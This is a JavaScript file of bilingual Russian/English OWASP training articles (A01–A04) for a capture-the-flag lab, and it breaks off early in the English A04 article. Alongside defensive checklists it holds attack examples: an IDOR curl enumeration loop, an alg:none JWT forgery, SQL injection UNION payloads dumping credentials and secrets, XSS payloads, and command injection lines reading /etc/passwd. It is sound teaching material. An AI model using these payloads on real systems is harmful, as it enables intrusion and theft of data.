/* Extensive bilingual theory articles for each OWASP module */
const THEORY = (() => {
  const M = (ru, en) => ({ ru, en });

  return {

/* ═══════════════════════════════════════════════════ A01 ═══ */
A01: M(`
<h3>1. Введение</h3>
<p><strong>Broken Access Control</strong> — категория №1 в OWASP Top 10:2021 и остаётся №1 в 2025. Это не «баг в одной строке», а системный провал модели прав: сервер не отвечает на вопрос <em>«имеет ли <strong>этот</strong> субъект право на <strong>этот</strong> объект/действие?»</em>.</p>
<p>Важно разделять понятия:</p>
<ul>
<li><strong>Authentication (AuthN)</strong> — кто ты (login, session, JWT).</li>
<li><strong>Authorization (AuthZ)</strong> — что тебе можно (ACL, RBAC, ABAC, ownership).</li>
</ul>
<p>Большинство IDOR и privilege escalation — это сломанный AuthZ при живом AuthN. Пользователь «настоящий», но ходит чужими данными.</p>

<h3>2. Почему это критично</h3>
<p>По статистике OWASP и bug bounty платформ (HackerOne, Bugcrowd) контроль доступа — самый частый finding с реальным impact: PII leak, financial fraud, account takeover, mass data export. В отличие от RCE «на одном endpoint», BAC часто масштабируется: один IDOR на <code>/api/invoices/{id}</code> = вся база счетов.</p>
<p>Бизнес-последствия: GDPR/152-ФЗ штрафы, компрометация B2B-клиентов, horizontal takeover цепочек аккаунтов (смена email → reset password).</p>

<h3>3. Таксономия атак</h3>
<p><strong>Horizontal privilege escalation</strong> — доступ к ресурсам другого пользователя того же уровня (alice читает заказы bob).</p>
<p><strong>Vertical privilege escalation</strong> — повышение роли (user → admin, user → support).</p>
<p><strong>Context / function abuse</strong> — вызов функции вне сценария (одобрить свой кредит, повторно применить купон, сменить цену в hidden field).</p>
<p><strong>IDOR (Insecure Direct Object Reference)</strong> — частный случай: ссылка на объект по предсказуемому идентификатору без проверки владельца.</p>
<p><strong>Path traversal / LFI</strong> — обход ограничений на путь к файлу (<code>../</code>, encoded variants).</p>
<p><strong>Forced browsing</strong> — знание/угадывание URL админки, backup, debug-панелей.</p>
<p><strong>CORS / postMessage / subdomain takeover</strong> — косвенный обход границ origin.</p>
<p><strong>Missing function-level access control</strong> — UI скрыл кнопку, API остался открытым.</p>

<h3>4. Как выглядит IDOR на практике</h3>
<div class="ebox">// Легитимный запрос alice (user_id=2)
GET /api/orders/101
Cookie: session=alice_sess
→ 200 {"id":101,"userId":2,"total":9.99}

// Атака: меняем только id
GET /api/orders/100
Cookie: session=alice_sess
→ 200 {"id":100,"userId":1,"total":999,"note":"ADMIN INTERNAL…"}
// Сервер не проверил: order.userId === session.userId</div>
<p>Варианты идентификаторов: sequential int, UUID (угадать сложнее, но утечка/ссылка всё равно IDOR), email, filename, invoice number, <code>documentId</code> в GraphQL.</p>

<h3>5. Где искать в приложении</h3>
<ul>
<li>REST: <code>GET/PUT/PATCH/DELETE /resource/{id}</code>, вложенные <code>/users/{uid}/docs/{did}</code>.</li>
<li>GraphQL: query/mutation с id без ownership; batch queries.</li>
<li>Mobile API: те же endpoint'ы, часто слабее UI-проверок.</li>
<li>Экспорт/отчёты, превью файлов, share-links, password reset tokens.</li>
<li>WebSocket / gRPC методы с object id.</li>
<li>Параметры: <code>user_id</code>, <code>account_id</code>, <code>org_id</code>, <code>tenant</code> — если клиент их шлёт, почти наверняка уязвимо.</li>
</ul>

<h3>6. Методика тестирования (2 аккаунта)</h3>
<ol>
<li>Создай User A и User B (или user + admin).</li>
<li>Собери все object id User A (Burp history, logger++).</li>
<li>Повтори каждый запрос с сессией User B.</li>
<li>Ожидание: 403/404. Факт: 200 с данными A → IDOR.</li>
<li>Для vertical: повтори admin API с user-сессией; убери role-claim из JWT и смотри, доверяет ли сервер.</li>
<li>Массовость: script/ffuf по id range; оцени impact (сколько объектов утекает).</li>
</ol>
<div class="ebox"># Пример грубой проверки диапазона (authorized lab only)
for i in $(seq 100 120); do
  curl -s -o /dev/null -w "%{http_code} $i\\n" \\
    -H "Cookie: session=$ALICE" \\
    "https://target/api/orders/$i"
done</div>

<h3>7. Обходы «защит», которые не работают</h3>
<ul>
<li>Скрытие кнопки в UI / client-side <code>if (role!=='admin')</code>.</li>
<li>UUID вместо int <em>без</em> authz (security through obscurity).</li>
<li>Проверка только на GET, забыли PUT/DELETE.</li>
<li>Проверка в одном microservice, другой BFF отдаёт без ACL.</li>
<li>403 на прямом id, но export/report endpoint отдаёт всё.</li>
<li>GraphQL introspection off, но mutation всё ещё открыта.</li>
</ul>

<h3>8. Реальные инциденты и CVE</h3>
<ul>
<li><code>CVE-2021-41773</code> — Apache HTTP path traversal: нормализация <code>../</code> обошла фильтр → чтение файлов вне webroot (и иногда RCE через CGI).</li>
<li><code>CVE-2023-23397</code> — Outlook: UNC path в reminder → Net-NTLM hash leak (фактически обход trust boundary клиента).</li>
<li><code>CVE-2021-22986</code> / <code>CVE-2022-1388</code> — F5 BIG-IP: admin API / auth bypass → unauth RCE.</li>
<li><code>CVE-2024-1708</code> — ScreenConnect SetupWizard path traversal → auth bypass.</li>
<li>Бесчисленные bug bounty: IDOR на invoice/PII/support tickets — топ выплачиваемых классов.</li>
</ul>

<h3>9. Модели авторизации</h3>
<p><strong>RBAC</strong> (Role-Based) — роли admin/user/support. Просто, но грубо: не решает «свой/чужой объект».</p>
<p><strong>ReBAC / ownership</strong> — связь subject–object (user owns order). Нужна для multi-tenant SaaS.</p>
<p><strong>ABAC</strong> — атрибуты (department, clearance, time). Гибко, сложнее в audit.</p>
<p><strong>Policy-as-code</strong> — OPA/Cedar/Rego: единый PDP, решения централизованы и тестируемы.</p>

<h3>10. Защита (checklist для разработчика)</h3>
<ul>
<li>На <strong>каждом</strong> handler: authn middleware + authz check (ownership или policy).</li>
<li>Deny by default; явный allow.</li>
<li>Роль/tenant только из server session/token claims после verify — никогда из body.</li>
<li>Единый слой authz (не копипаста if в 40 контроллерах).</li>
<li>Тесты: negative cases (чужой id → 403) в CI.</li>
<li>Rate limit на enumeration; audit log доступа к чувствительным объектам.</li>
<li>Для файлов: store key = random, ACL в metadata, не path = user input.</li>
</ul>
<div class="ebox">// Паттерн secure
app.get('/api/orders/:id', requireAuth, async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  if (!order) return res.status(404).end();
  if (order.userId !== req.user.id && req.user.role !== 'admin')
    return res.status(403).json({ error: 'Forbidden' });
  return res.json(publicView(order));
});</div>

<h3>11. Инструменты</h3>
<p>Burp Suite (Autorize, AuthMatrix, AutoRepeater), OWASP ZAP, ffuf, custom scripts, Postman collections с двумя env (userA/userB), GraphQL Voyager + manual id swap.</p>

<h3>12. Связь с другими категориями</h3>
<p>IDOR часто усиливается <strong>A07</strong> (weak session → чужая сессия), <strong>A05</strong> (debug/admin exposed), <strong>A04</strong> (design: client sends price). В 2025 BAC по-прежнему #1.</p>

<h3>13. Задание лаборатории RØOT</h3>
<p>Ты — alice (user_id=2). Свой заказ <code>101</code>. Получи заказ <code>100</code> (admin) через IDOR и захвати флаг. Затем сравни Fix: ownership check vs «просто отдать любой id».</p>

<h3>14. Дополнительное чтение</h3>
<p>OWASP Broken Access Control · PortSwigger Access control labs · OWASP API Top 10 (API1 BOLA = IDOR для API) · «The Web Application Hacker's Handbook» ch. Access Control.</p>
`, `
<h3>1. Introduction</h3>
<p><strong>Broken Access Control</strong> is #1 in OWASP Top 10:2021 and remains #1 in 2025. The server fails to answer: <em>does <strong>this</strong> subject have rights to <strong>this</strong> object/action?</em></p>
<p>Separate:</p>
<ul>
<li><strong>Authentication (AuthN)</strong> — who you are.</li>
<li><strong>Authorization (AuthZ)</strong> — what you may do.</li>
</ul>
<p>Most IDOR and privilege escalation cases are broken AuthZ with working AuthN.</p>

<h3>2. Why it matters</h3>
<p>Across OWASP data and bug bounty platforms, access control is the most common high-impact finding: PII leaks, fraud, account takeover, bulk export. One IDOR on <code>/api/invoices/{id}</code> can mean the entire invoice corpus.</p>

<h3>3. Attack taxonomy</h3>
<p><strong>Horizontal</strong> — peer user data. <strong>Vertical</strong> — user→admin. <strong>IDOR</strong> — direct object reference without ownership checks. <strong>Path traversal</strong>, <strong>forced browsing</strong>, missing function-level controls, CORS/origin boundary issues.</p>

<h3>4. IDOR in practice</h3>
<div class="ebox">GET /api/orders/101  (alice) → her order
GET /api/orders/100  (alice) → admin order  // missing ownership check</div>

<h3>5. Where to look</h3>
<ul>
<li>REST <code>/resource/{id}</code>, nested resources, GraphQL ids, mobile APIs, exports, share links, WebSocket methods.</li>
<li>Client-supplied <code>user_id</code> / <code>org_id</code> / <code>tenant</code> is a red flag.</li>
</ul>

<h3>6. Testing methodology (two accounts)</h3>
<ol>
<li>Create User A and User B.</li>
<li>Collect all of A's object IDs from proxy history.</li>
<li>Replay every request with B's session.</li>
<li>Expect 403/404; 200 with A's data = IDOR.</li>
<li>For vertical: hit admin APIs with a low-priv session.</li>
<li>Enumerate ID ranges carefully in authorized scope only.</li>
</ol>

<h3>7. Fake defenses</h3>
<ul>
<li>Hiding UI buttons; client-side role checks.</li>
<li>UUIDs without authz; checking only GET; one microservice enforces, another does not.</li>
</ul>

<h3>8. Real incidents</h3>
<p><code>CVE-2021-41773</code> Apache path traversal · <code>CVE-2023-23397</code> Outlook NTLM · F5 auth bypasses · ScreenConnect · endless bounty IDOR on invoices/PII.</p>

<h3>9. AuthZ models</h3>
<p>RBAC, ownership/ReBAC, ABAC, policy-as-code (OPA/Cedar). Multi-tenant SaaS almost always needs object-level checks, not roles alone.</p>

<h3>10. Developer checklist</h3>
<ul>
<li>Authn + authz on every handler; deny by default.</li>
<li>Roles/tenants from verified server session only.</li>
<li>Central policy layer; negative tests in CI.</li>
<li>Audit sensitive object access; limit enumeration.</li>
</ul>
<div class="ebox">if (order.userId !== req.user.id && req.user.role !== 'admin')
  return res.status(403).json({ error: 'Forbidden' });</div>

<h3>11. Tools</h3>
<p>Burp Autorize/AuthMatrix, ZAP, ffuf, dual-env Postman, GraphQL manual id swaps.</p>

<h3>12. Related categories</h3>
<p>Amplifies A07 (session), A05 (exposed admin), A04 (client-trusted fields). Still #1 in 2025.</p>

<h3>13. RØOT task</h3>
<p>As alice, fetch order <code>100</code> via IDOR and capture the flag. Compare with the Fix tab ownership check.</p>

<h3>14. Further reading</h3>
<p>OWASP BAC · PortSwigger Access control · OWASP API1 BOLA · WAHH access control chapter.</p>
`),

/* ═══════════════════════════════════════════════════ A02 ═══ */
A02: M(`
<h3>1. Введение</h3>
<p><strong>Cryptographic Failures</strong> (OWASP 2021 A02, 2025 A04) — класс проблем, где конфиденциальность/целостность данных страдает из‑за отсутствия криптографии, выбора слабых примитивов, ошибок протокола или управления ключами. Раньше категория называлась Sensitive Data Exposure — акцент сместился на <em>причину</em>: крипту.</p>

<h3>2. Что именно ломается</h3>
<ul>
<li><strong>Confidentiality</strong> — plaintext passwords, PII at rest/in transit, keys in logs.</li>
<li><strong>Integrity</strong> — unsigned tokens, malleable ciphertext, JWT without verify.</li>
<li><strong>Authenticity</strong> — forged cookies/JWT, spoofed webhooks without HMAC.</li>
</ul>

<h3>3. Хранение паролей — подробно</h3>
<p>Хэш пароля должен быть <strong>медленным</strong> и <strong>memory-hard</strong>, с уникальной солью на пользователя.</p>
<div class="ebox">Плохо (быстро ломается GPU):
md5(password), sha1(password), sha256(password)
sha256(password + salt)  // всё ещё слишком быстро

Приемлемо:
bcrypt(password, cost=12+)
scrypt / PBKDF2-HMAC-SHA256 (высокие iterations)
argon2id(password, salt, m=64MB, t=3, p=1)  // предпочтительно</div>
<p>Почему MD5/SHA «как для паролей» убийственны: RTX‑класс GPU даёт десятки–сотни GH/s на MD5. 8‑символьный пароль из типового словаря — минуты. Argon2id упирается в RAM — parallel attack дорогой.</p>
<p>Дополнительно: pepper (серверный секрет в KMS) + проверка пароля против Have I Been Pwned (k-anonymity API) при регистрации.</p>

<h3>4. TLS и транспорт</h3>
<ul>
<li>Только TLS 1.2+ (лучше 1.3); отключить RC4, 3DES, export ciphers, compression (CRIME).</li>
<li>HSTS, certificate pinning (mobile — осторожно с UX).</li>
<li>Не слать secrets в query string (логи прокси, Referer).</li>
<li>Mixed content: HTTPS page + HTTP API = MitM.</li>
</ul>
<p>История: <strong>Heartbleed (CVE-2014-0160)</strong> — over-read в OpenSSL heartbeat, утечка RAM (private keys, session tickets). <strong>LOGJAM</strong> — downgrade DHE. <strong>POODLE/BEAST</strong> — legacy SSL/TLS flaws.</p>

<h3>5. JWT — целый класс крипто-ошибок</h3>
<p>JWT = <code>base64url(header).base64url(payload).signature</code>. Payload <em>не зашифрован</em> (только encoded) — не клади туда secrets.</p>
<p><strong>alg:none</strong> — некоторые библиотеки принимали <code>{"alg":"none"}</code> и не проверяли подпись. Атакующий меняет <code>role</code> на admin.</p>
<div class="ebox">// Атака alg:none
header  = {"alg":"none","typ":"JWT"}
payload = {"sub":"alice","role":"admin"}
token   = b64(header) + "." + b64(payload) + "."   // пустая подпись

// Защита
jwt.verify(token, key, { algorithms: ['HS256'] }) // whitelist!</div>
<p>Другие JWT-атаки:</p>
<ul>
<li><strong>Weak HMAC secret</strong> — brute с jwt-cracker / hashcat mode 16500.</li>
<li><strong>RS256 → HS256 confusion</strong> — сервер ждёт RSA public, атакующий подписывает HMAC public key как secret.</li>
<li><strong>kid injection</strong> — path traversal / SQLi в key id.</li>
<li><strong>jku/x5u</strong> — указатель на JWKS атакующего.</li>
<li>Долгий <code>exp</code>, нет <code>aud</code>/<code>iss</code> validation.</li>
</ul>

<h3>6. Ключи и секреты</h3>
<ul>
<li>Hard-coded в git/mobile → secret scanning (gitleaks, trufflehog).</li>
<li>Один ключ на все среды; нет ротации.</li>
<li>Ключи в frontend bundle («API_SECRET в React»).</li>
<li>Правильно: KMS/Vault/Secrets Manager, short-lived credentials, separate keys per env.</li>
</ul>

<h3>7. Шифрование at rest</h3>
<p>AES-GCM / ChaCha20-Poly1305 для authenticated encryption. Избегай ECB. Не пиши свой crypto. IV/nonce: уникальный на сообщение. Для БД: transparent disk encryption ≠ column-level protection от SQL injection exfil (разные threat models).</p>

<h3>8. Как тестировать</h3>
<ul>
<li>Перехват трафика: plaintext HTTP? secrets в URL?</li>
<li>Decode JWT на jwt.io (offline!) — claims, alg.</li>
<li>Попытка alg:none / role tampering.</li>
<li>Поиск secrets в JS bundles, APK, .env в репо.</li>
<li>sslscan / testssl.sh на cipher suites.</li>
<li>Проверка password reset tokens: entropy, TTL, single-use.</li>
</ul>

<h3>9. Реальные инциденты</h3>
<ul>
<li><code>CVE-2014-0160</code> Heartbleed — ключи и сессии из RAM.</li>
<li><code>CVE-2023-4966</code> CitrixBleed — session token leak → MFA bypass.</li>
<li>Массовые утечки БД с MD5/SHA1 паролями → credential stuffing (A07).</li>
<li>Hard-coded AWS keys в публичных GitHub repos → crypto-mining за часы.</li>
</ul>

<h3>10. Чеклист защиты</h3>
<ul>
<li>argon2id/bcrypt для паролей; never reversible encryption for passwords.</li>
<li>TLS everywhere; HSTS; no sensitive query params.</li>
<li>JWT: algorithm allowlist, short TTL, right audience, strong secrets / asymmetric.</li>
<li>Secrets в secret manager; rotate; scan git history.</li>
<li>AEAD ciphers; don't roll your own.</li>
<li>Encrypt backups; classify data (what needs crypto at all).</li>
</ul>

<h3>11. Инструменты</h3>
<p>testssl.sh, sslyze, jwt_tool, hashcat, gitleaks, CyberChef, openssl s_client, Burp JWT editor.</p>

<h3>12. Лаборатория</h3>
<p>Собери JWT с <code>alg:none</code> и <code>role=admin</code>, пройди verify endpoint, забери флаг. На Fix-вкладке — whitelist algorithms.</p>

<h3>13. Дополнительно</h3>
<p>OWASP Cryptographic Storage Cheat Sheet · JWT RFC 7519 best practices · «Cryptographic Right Answers» (Latacora) · PortSwigger JWT labs.</p>
`, `
<h3>1. Introduction</h3>
<p><strong>Cryptographic Failures</strong> (OWASP 2021 A02, 2025 A04) cover missing crypto, weak primitives, protocol mistakes, and key-management failures. Formerly “Sensitive Data Exposure” — focus is now on the cryptographic cause.</p>

<h3>2. What breaks</h3>
<ul>
<li><strong>Confidentiality</strong> — plaintext secrets/PII.</li>
<li><strong>Integrity</strong> — unsigned/malleable tokens.</li>
<li><strong>Authenticity</strong> — forged JWTs/webhooks.</li>
</ul>

<h3>3. Password storage</h3>
<div class="ebox">Bad: md5/sha1/sha256(password) — GPU-friendly
OK: bcrypt cost≥12, scrypt, argon2id (preferred)</div>
<p>Use unique salts, optional pepper in KMS, and breached-password checks on signup.</p>

<h3>4. TLS</h3>
<p>TLS 1.2+ (prefer 1.3), modern ciphers, HSTS, no secrets in URLs. History: Heartbleed, LOGJAM, POODLE.</p>

<h3>5. JWT pitfalls</h3>
<ul>
<li><code>alg:none</code>, weak HMAC secrets, RS256→HS256 confusion, kid/jku injection.</li>
<li>Payload is only encoded — not encrypted.</li>
<li>Always verify with an algorithm allowlist.</li>
</ul>
<div class="ebox">jwt.verify(token, key, { algorithms: ['HS256','RS256'] })</div>

<h3>6. Key management</h3>
<p>No hard-coded secrets; use KMS/Vault; rotate; never ship secrets in frontend bundles.</p>

<h3>7. Encryption at rest</h3>
<p>Prefer AEAD (AES-GCM, ChaCha20-Poly1305). Unique nonces. Don't invent crypto.</p>

<h3>8. How to test</h3>
<p>Proxy traffic, decode JWTs offline, try alg:none, scan repos/bundles for secrets, testssl.sh cipher audit.</p>

<h3>9. Real incidents</h3>
<p>Heartbleed · CitrixBleed · MD5 password dumps fueling stuffing · AWS keys in public git.</p>

<h3>10. Hardening checklist</h3>
<p>Slow password hashes · TLS everywhere · JWT allowlists · secret managers · AEAD · classified data inventory.</p>

<h3>11. Tools</h3>
<p>testssl.sh, jwt_tool, hashcat, gitleaks, CyberChef, Burp.</p>

<h3>12. Lab</h3>
<p>Forge <code>alg:none</code> admin JWT and capture the flag.</p>

<h3>13. Reading</h3>
<p>OWASP Cryptographic Storage · JWT BCP · Latacora crypto right answers · PortSwigger JWT labs.</p>
`),

/* ═══════════════════════════════════════════════════ A03 ═══ */
A03: M(`
<h3>1. Введение</h3>
<p><strong>Injection</strong> — нарушение границы «данные ≠ инструкции». Пользовательский ввод попадает в интерпретатор (SQL engine, shell, LDAP, XPath, template engine, HTML/JS parser) и исполняется как код. OWASP 2021 A03; 2025 — A05, но injection никуда не делась из real-world pentest.</p>

<h3>2. Семейства injection</h3>
<ul>
<li><strong>SQL / NoSQL</strong> — классика web.</li>
<li><strong>OS command</strong> — <code>; | &amp; \` $( )</code> в ping/diagnostic tools.</li>
<li><strong>LDAP / XPath / SMTP header</strong>.</li>
<li><strong>XSS</strong> — injection в HTML/JS context (browser interpreter).</li>
<li><strong>SSTI</strong> — server-side template injection (Jinja2, Freemarker, Twig).</li>
<li><strong>Expression languages</strong> — OGNL, SpEL, MVEL (часто RCE).</li>
<li><strong>Header injection / CRLF</strong> — log forging, response splitting (legacy).</li>
</ul>

<h3>3. SQL Injection — механика</h3>
<p>Уязвимый паттерн: склейка SQL-строки.</p>
<div class="ebox">query = "SELECT * FROM users WHERE user='" + u + "' AND pass='" + p + "'"

// u = admin'--
// → SELECT * FROM users WHERE user='admin'--' AND pass='...'
// комментарий отрезает проверку пароля</div>
<p><strong>In-band</strong> — результат в том же канале (error-based, UNION). <strong>Inferential (blind)</strong> — boolean (страница чуть отличается) или time-based (<code>SLEEP</code>/<code>pg_sleep</code>/<code>WAITFOR</code>). <strong>Out-of-band</strong> — DNS/HTTP callback из СУБД (xp_dirtree, COPY TO PROGRAM, UTL_HTTP).</p>

<h3>4. UNION-based подробно</h3>
<ol>
<li>Найди точку инъекции (quote error).</li>
<li><code>ORDER BY n--</code> — число колонок.</li>
<li><code>UNION SELECT null,null,...--</code> — выравнивание типов.</li>
<li>Подставь интересные колонки: version(), user tables.</li>
<li>Information schema / sqlite_master / pg_catalog — разведка схемы.</li>
<li>Dump credentials, secrets, PII.</li>
</ol>
<div class="ebox">' ORDER BY 3--
' UNION SELECT null,username,password FROM users--
' UNION SELECT key_name,secret_value,null FROM secrets--</div>

<h3>5. XSS — три типа</h3>
<p><strong>Reflected</strong> — payload в запросе сразу в HTML-ответе (search, error, redirect). Нужен social engineering / link.</p>
<p><strong>Stored</strong> — payload в БД (comment, profile, filename) бьёт каждого зрителя, включая admin (часто → takeover).</p>
<p><strong>DOM-based</strong> — sink в JS: <code>innerHTML</code>, <code>document.write</code>, опасный <code>eval</code>, jQuery <code>.html()</code>.</p>
<div class="ebox">&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;
" onfocus=alert(1) autofocus="</div>
<p>Impact XSS: session theft (если нет HttpOnly), keylogging, fake login forms, wormable stored XSS, CSRF-с-правами жертвы, bypass CSP иногда через gadgets.</p>

<h3>6. Command injection</h3>
<div class="ebox">// "ping" feature
system("ping " + ip);
// ip = 127.0.0.1; cat /etc/passwd
// ip = 127.0.0.1 && whoami
// ip = \`id\`</div>
<p>Слепая: time delays, out-of-band DNS. Защита: не вызывать shell; <code>execFile</code> с аргументами-массивом; allowlist IP regex.</p>

<h3>7. SSTI (кратко)</h3>
<p>Probe: <code>{{7*7}}</code> → <code>49</code>. Дальше RCE через object graph (Jinja2, Freemarker). Очень опасно в error pages и mail templates.</p>

<h3>8. Как искать injection</h3>
<ul>
<li>Все input points: query, body, headers (User-Agent, X-Forwarded-For!), cookies, file names, JSON fields.</li>
<li>Полиглоты: <code>'\"&gt;&lt;</code>, time payloads, OAST.</li>
<li>Автоматизация: sqlmap (осторожно на prod), Burp Scanner, manual first.</li>
<li>Смотри различия length/status/time; error messages (stack + SQL).</li>
<li>WAF bypass: encoding, comments <code>/**/</code>, case, chunked — только после понимания root cause.</li>
</ul>

<h3>9. Защита SQL</h3>
<div class="ebox">// Единственный правильный default
db.prepare('SELECT * FROM users WHERE user=? AND pass=?').get(u, p);

// ORM: OK если без raw
User.findOne({ where: { user: u } })

// ОПАСНО
sequelize.query(\`SELECT ... WHERE user='$\{u}'\`)
db.raw('... ' + u)</div>
<p>Least privilege DB user; disable xp_cmdshell / dangerous routines; separate read replicas; WAF — defense-in-depth, не костыль.</p>

<h3>10. Защита XSS</h3>
<ul>
<li>Context-aware output encoding (HTML, attr, JS, URL).</li>
<li>CSP: <code>default-src 'self'; script-src 'nonce-...'</code> — сильно режет impact.</li>
<li>HttpOnly + Secure + SameSite cookies.</li>
<li>Sanitize rich HTML allowlist (DOMPurify) если нужен WYSIWYG.</li>
<li>Не клади untrusted data в <code>innerHTML</code>.</li>
</ul>

<h3>11. Реальные инциденты</h3>
<ul>
<li><code>CVE-2014-6271</code> ShellShock — bash выполнял commands из env (CGI headers).</li>
<li><code>CVE-2022-26134</code> / <code>CVE-2021-26084</code> Confluence OGNL — unauth RCE.</li>
<li>Исторические mass SQLi (MoveIt и др. — часто combined with other flaws).</li>
<li>Stored XSS в support tickets → admin cookie theft.</li>
</ul>

<h3>12. Инструменты</h3>
<p>sqlmap, Burp, hackvertor, XSS hunter / blind XSS callbacks, tplmap (SSTI), Commix (command), NoSQLMap.</p>

<h3>13. Лаборатория</h3>
<p>Login: <code>admin'--</code> или UNION к secrets. Search field — reflected XSS sink. Сравни prepared statements на Fix.</p>

<h3>14. Дополнительно</h3>
<p>OWASP Injection Prevention · PortSwigger SQLi/XSS learning paths · OWASP ASVS V5 · sqlmap docs.</p>
`, `
<h3>1. Introduction</h3>
<p><strong>Injection</strong> breaks the data/code boundary: user input is executed by SQL engines, shells, LDAP, templates, or HTML/JS parsers. OWASP 2021 A03; 2025 A05 — still everywhere in real assessments.</p>

<h3>2. Injection families</h3>
<p>SQL/NoSQL, OS command, LDAP/XPath, XSS, SSTI, expression languages (OGNL/SpEL), CRLF/header injection.</p>

<h3>3. SQLi mechanics</h3>
<div class="ebox">"SELECT * FROM users WHERE user='" + u + "'"
// u = admin'--  → password check commented out</div>
<p>In-band (error/UNION), blind boolean/time, out-of-band DNS/HTTP.</p>

<h3>4. UNION workflow</h3>
<p>Find inject point → column count via ORDER BY → UNION SELECT nulls → extract schema → dump tables.</p>

<h3>5. XSS types</h3>
<p>Reflected, stored, DOM-based. Impact: session theft, worms, admin takeover, CSRF as victim.</p>

<h3>6. Command injection</h3>
<p>Dangerous sinks: system/exec with string concat. Use argv arrays + allowlists; never shell if avoidable.</p>

<h3>7. SSTI</h3>
<p>Probe <code>{{7*7}}</code>; escalate to RCE via template object graphs.</p>

<h3>8. How to hunt</h3>
<p>All inputs including headers/cookies; polyglots; time/OAST; sqlmap carefully; observe length/status/time deltas.</p>

<h3>9. SQLi defenses</h3>
<p>Prepared statements always; least-privilege DB; no raw string queries; WAF as secondary control only.</p>

<h3>10. XSS defenses</h3>
<p>Context encoding, CSP nonces, HttpOnly cookies, DOMPurify for rich HTML, avoid innerHTML sinks.</p>

<h3>11. Real incidents</h3>
<p>ShellShock · Confluence OGNL · mass SQLi campaigns · stored XSS→admin ATO.</p>

<h3>12. Tools</h3>
<p>sqlmap, Burp, tplmap, Commix, XSS hunter platforms.</p>

<h3>13. Lab</h3>
<p>Bypass login with SQLi / UNION secrets; demo reflected XSS; study prepared statements on Fix.</p>

<h3>14. Reading</h3>
<p>OWASP Injection Prevention · PortSwigger SQLi/XSS · OWASP ASVS · sqlmap docs.</p>
`),

/* ═══════════════════════════════════════════════════ A04 ═══ */
A04: M(`
<h3>1. Введение</h3>
<p><strong>Insecure Design</strong> (OWASP 2021 A04, 2025 A06) — категория про <em>архитектурные</em> провалы. Даже идеальная реализация плохо спроектированной фичи останется опасной. Это не «забыли escape'ить кавычку», а «продукт позволяет то, чего бизнес-угроза не должна допускать».</p>

<h3>2. Design vs Implementation</h3>
<div class="ebox">Implementation bug:  SQL string concat → SQLi (A03)
Design flaw:         4-digit OTP, no rate limit, no lockout
                     → полный перебор mathematically guaranteed

Implementation fix:  prepared statements
Design fix:          6+ digit OTP + attempt budget + step-up MFA + device binding</div>
<p>Патч «добавить captcha на фронте» без серверного счётчика попыток — не design fix.</p>

<h3>3. Типичные insecure design patterns</h3>
<ul>
<li><strong>Слабые recovery flows</strong> — security questions, «дата рождения + последние 4 SSN».</li>
<li><strong>Недостаточная энтропия токенов</strong> — 4–6 digit codes для money movement.</li>
<li><strong>Отсутствие anti-automation</strong> — scraping, stuffing, brute.</li>
<li><strong>Trust client</strong> — цена, role, discount, isVip в JSON от браузера.</li>
<li><strong>Broken state machine</strong> — пропуск шагов checkout, повторный refund.</li>
<li><strong>Oversharing</strong> — «для удобства» храним PAN, избыточный PII, вечные magic links.</li>
<li><strong>One-size multi-tenant</strong> — нет жёсткой изоляции tenant boundary на design уровне.</li>
</ul>

<h3>4. Кейс: OTP brute (лаборатория)</h3>
<p>4 цифры = 10 000 комбинаций. Без rate limit и lockout:</p>
<div class="ebox">10 req/s   → ~17 минут до гарантии
100 req/s  → ~100 секунд
1000 req/s → ~10 секунд (ботнет/async)

Защитный design:
- 6–8 цифр или crypto-random token (32+ bytes)
- max 5 attempts → cooldown 15 min
- progressive delay / CAPTCHA after N fails
- bind OTP to device/session; one-time; short TTL (30–60s)
- alert on burst patterns</div>

<h3>5. Threat modeling (STRIDE)</h3>
<p>На этапе дизайна рисуют DFD (Data Flow Diagram) и для каждого элемента спрашивают:</p>
<ul>
<li><strong>S</strong>poofing — кто может притвориться?</li>
<li><strong>T</strong>ampering — что можно подменить?</li>
<li><strong>R</strong>epudiation — можно ли отрицать действие?</li>
<li><strong>I</strong>nformation disclosure — что утечёт?</li>
<li><strong>D</strong>oS — как уронить?</li>
<li><strong>E</strong>levation of privilege — как повысить права?</li>
</ul>
<p>Альтернативы/дополнения: LINDDUN (privacy), PASTA, attack trees, abuse cases в user stories («as an attacker I want…»).</p>

<h3>6. Secure design principles</h3>
<ul>
<li>Least privilege, need-to-know.</li>
<li>Defense in depth.</li>
<li>Secure defaults (opt-in risky features).</li>
<li>Fail secure (fail-closed), не fail-open.</li>
<li>Complete mediation — проверка на каждый запрос.</li>
<li>Separation of duties (для админ-операций).</li>
<li>Economy of mechanism — проще атаковать сложное и кривое.</li>
</ul>

<h3>7. Business logic testing</h3>
<p>Классический app scanner плохо ловит design flaws. Нужен мозг:</p>
<ul>
<li>Повторные купоны, negative quantity, currency confusion.</li>
<li>Race conditions (TOCTOU) на баланс/inventory — parallel requests.</li>
<li>Workflow skip: вызвать step 3 без step 1–2.</li>
<li>Price tampering в hidden fields / mobile API.</li>
<li>Referral/bonus self-loops.</li>
</ul>

<h3>8. Реальные истории</h3>
<ul>
<li>Банки с 4-digit SMS OTP без lockout — массовый account takeover через combo lists + SMS intercept/simswap (design + A07).</li>
<li><code>CVE-2022-30190</code> Follina — опасная модель URI/preview handlers в Office.</li>
<li>Capital One: architecture с broad IAM + SSRF path — design of cloud permissions.</li>
<li>Хранение CVV/PAN «чтобы клиенту было удобно» — прямой конфликт с PCI DSS.</li>
</ul>

<h3>9. Как «чинить design»</h3>
<ul>
<li>Пересмотреть user stories с abuse cases.</li>
<li>Явные server-side invariants (assert balance >= 0, state transitions).</li>
<li>Budget на anti-abuse: rate limits, device fingerprinting, risk scoring.</li>
<li>Data minimization: не хранить то, что не нужно (tokenization карт).</li>
<li>Security design review gate до coding.</li>
</ul>

<h3>10. Связь с другими OWASP</h3>
<p>Insecure design порождает A01 (нет authz model), A07 (слабый login design), A09 (не заложили audit), A04/A05 cloud. В 2025 категория остаётся в топе как A06.</p>

<h3>11. Лаборатория</h3>
<p>4-digit OTP без lockout: auto brute-force покажет, что «математика побеждает». Fix — attempts + cooldown + longer codes.</p>

<h3>12. Чтение</h3>
<p>OWASP Threat Modeling · Microsoft STRIDE docs · «Threat Modeling: Designing for Security» (Shostack) · PortSwigger business logic labs.</p>
`, `
<h3>1. Introduction</h3>
<p><strong>Insecure Design</strong> (2021 A04, 2025 A06) is about architectural failures. Perfect implementation of a bad design remains unsafe.</p>

